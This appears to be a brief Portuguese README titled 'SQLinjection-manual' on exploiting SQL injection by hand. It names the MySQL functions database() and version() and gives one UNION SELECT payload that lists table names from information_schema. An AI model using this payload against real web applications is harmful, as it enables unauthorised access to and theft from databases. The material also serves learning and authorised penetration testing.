# SQLinjection-manual
parâmetros para explorar SQLinjection Manualmente

## depois de ter a certeza que uma aplicação web está vulnerável a sql injection, você deve querer acessar o banco de dados:
# parâmetros
```
database() -> serve para mostrar o nome do banco de dados
```
```
version() -> serve para mostrar a versão do banco de dados
```

# exemplo de uso
```
-3 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() limit 0,1
```
